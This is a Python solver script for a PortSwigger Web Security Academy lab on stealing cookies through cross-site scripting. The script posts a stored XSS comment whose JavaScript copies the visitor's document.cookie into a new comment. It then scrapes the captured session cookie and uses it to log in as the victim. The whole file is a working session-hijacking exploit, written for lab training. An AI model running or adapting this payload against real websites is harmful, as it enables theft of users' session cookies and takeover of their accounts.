import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from string import Template
import re

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
# author: 0xyf


class XSS22:
    def __init__(self):
        self.lab_id = "0ac9003c03aa94ef80900d7200570098"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.post_id = 6
        self.csrf_url = f"{self.url}/post?postId={self.post_id}"
        self.vuln_url = f"{self.url}/post/comment"
        self.login_url = f"{self.url}/login"

    def get_csrf_token(self):
        r = requests.get(f"{self.csrf_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, data):
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            cookies=self.cookies,
            verify=False,
        )
        return r

    def stored_xss(self):
        self.get_csrf_token()
        payload = Template(
            """<script>
        window.addEventListener("DOMContentLoaded", function(){
            var token = document.getElementsByName('csrf')[0].value;
            var data = new FormData();

            data.append('csrf', token);
            data.append('postId', $post_id);
            data.append('comment', "cookie: " + document.cookie);
            data.append('name', 'victim');
            data.append('email', '0xyf@0xyf.local');
            data.append('website', 'https://yufongg.github.io');

            fetch('/post/comment',{
                method: 'POST',
                mode: 'no-cors',
                body: data
            });
        });
        </script>"""
        )
        payload = payload.substitute(
            post_id=self.post_id,
        )
        data = {
            "csrf": self.csrf_token,
            "postId": self.post_id,
            "comment": payload,
            "name": "0xyf",
            "email": "0xyf@0xyf.local",
            "website": f"https://yufongg.github.io",
        }
        r = self.execute_request(data)

    def get_cookie_frm_cmt(self):
        sleep(2)
        r = requests.get(f"{self.csrf_url}")
        pattern = r"session=(.*)</p>"
        match = re.search(pattern, r.text)
        self.cookies = {"session": match.group(1)}

    def login(self):
        self.get_cookie_frm_cmt()
        print(f"[*] Attempting to with cookie {self.cookies}")
        r = requests.get(
            self.login_url,
            cookies=self.cookies,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.stored_xss()
        self.login()
        self.check_solved()


def main():
    XSS22().solve()


if __name__ == "__main__":
    main()
